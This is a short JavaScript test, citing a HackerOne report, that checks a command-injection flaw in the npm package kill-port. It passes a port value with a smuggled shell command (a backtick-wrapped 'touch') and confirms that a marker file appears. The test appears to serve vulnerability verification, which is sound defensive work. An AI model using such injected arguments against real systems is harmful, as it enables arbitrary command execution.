//https://hackerone.com/reports/389561
test("Command Injection in kill-port", () => {
  const kill = require("kill-port");
  const fs = require("fs");
  const path = "./kill-port";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  kill("23;`touch kill-port; 2222222222`");

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
